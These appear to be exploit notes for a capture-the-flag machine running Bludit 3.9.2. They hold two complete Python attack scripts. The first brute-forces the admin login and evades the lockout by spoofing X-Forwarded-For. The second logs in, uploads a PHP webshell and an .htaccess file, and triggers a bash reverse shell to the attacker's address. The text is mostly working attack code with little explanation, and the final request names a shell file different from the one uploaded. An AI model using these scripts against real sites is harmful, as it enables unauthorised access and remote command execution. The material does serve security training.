____

### Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass

https://github.com/noraj/Bludit-auth-BF-bypass

https://github.com/ColdFusionX/CVE-2019-17240_Bludit-BF-Bypass

```bash
python3 exploit.py -l http://$IP/admin/login.php -u users -p wordlist
```

```python
#!/usr/bin/env python3
import re
import requests
import sys

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'

with open(sys.argv[1], 'r') as f:
    wordlist = [x.strip() for x in f.readlines()]

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print(f'\r[*] Trying: {password:<90}'.format(p = password), end="", flush=True)

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print('\rSUCCESS: Password found!' + 50*" ")
            print(f'Use {username}:{password} to login.')
            print()
            break
```



### PHP Upload Exploit

1. Login.
2. Get a CSRF token from the uploads page.
3. Upload the webshell as a `.php` file. Server will say it fails, but copy will still be saved in `/bl-content/tmp`.
4. Upload `.htaccess` file that turns off `RewriteEngine`.
5. Trigger webshell with reverse shell on port 443.

```python
#!/usr/bin/env python3

import netifaces as ni
import re
import requests


callback_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
username = 'fergus'
password = 'RolandDeschain'
url = 'http://10.10.10.191'


s = requests.session()

# Login
resp = s.get(f'{url}/admin/')
csrf = re.findall('name="tokenCSRF" value="([0-9a-f]{32,})"', resp.text)[0]
s.post(f'{url}/admin/', allow_redirects=False,
        data = {'tokenCSRF': csrf, 'username': username, 'password': password, 'remember': 'true', 'save': ''})

# Get CSRF to upload images
resp = s.get(f'{url}/admin/new-content/index.php')
csrf = re.findall('\nvar tokenCSRF = "([0-9a-f]{32,})";', resp.text)[0]

# Upload webshell
form_data = {'images[]': ('shell.php', '<?php system($_REQUEST["cmd"]); ?>', 'image/png')}
data = {'uuid': 'junk',
        'tokenCSRF': csrf}
s.post(f'{url}/admin/ajax/upload-images', data=data, files=form_data, allow_redirects=False)

# Upload .htaccess file
form_data = {'images[]': ('.htaccess', 'RewriteEngine off', 'image/png')}
s.post(f'{url}/admin/ajax/upload-images', data=data, files=form_data, allow_redirects=False)

# Trigger Shell
resp = s.get(f'{url}/bl-content/tmp/0xdf.php', params={'cmd':f'bash -c "bash -i >& /dev/tcp/{callback_ip}/443 0>&1"'})
```
